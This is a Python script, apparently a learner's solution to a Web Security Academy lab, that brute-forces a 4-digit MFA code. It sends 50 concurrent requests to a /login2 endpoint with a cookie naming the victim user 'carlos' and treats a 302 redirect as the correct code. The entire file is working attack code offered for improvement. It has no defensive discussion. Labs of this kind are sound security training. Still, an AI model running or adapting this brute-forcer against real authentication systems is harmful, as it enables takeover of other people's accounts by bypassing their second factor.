# i wrote a code to automate bruteforcing a 4 didgit authentication code and used multithreading in python to improve speed
# the code isn't perfect so i am open to suggestions
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import sys
import time

url = "https://0af500fe03341df3817616d100980045.web-security-academy.net/login2"
data = {'mfa-code' : ''}
cookies = {'verify':'carlos'}


def make_request(session, pin):
    try:
        r = session.post(url,data={'mfa-code':pin}, cookies=cookies, allow_redirects=False)
    except Exception:
        return None
    
    if r.status_code == 302:
        print(f"passcode is: {pin}")
        return pin
    else:
        sys.stdout.write(f"\r loading ... {pin} and code: {r.status_code}")
        sys.stdout.flush()
        return None

def brute_force():
    # there are 10^4 possible combinations since we have 10 digits and 4 possible combination
    # represent the code in 4 digit format
    pins = [f"{i:04d}" for i in range(10000)]
    session = requests.Session() # keep connection alive
    # making multiple threads to perform the request
    with ThreadPoolExecutor(max_workers=50) as executor:
        # variables to hold all actions performeed for each thread
        futures = {executor.submit(make_request,session,pin): pin for pin in pins}
        #checking for completed actions and their results
        for fut in as_completed(futures):
            result = fut.result()
            # if any of the thread workers making the request found the redirect code result will contain it
            if result:
                print(f"found result: {result}")
                executor.shutdown(wait=False)
                return

brute_force()
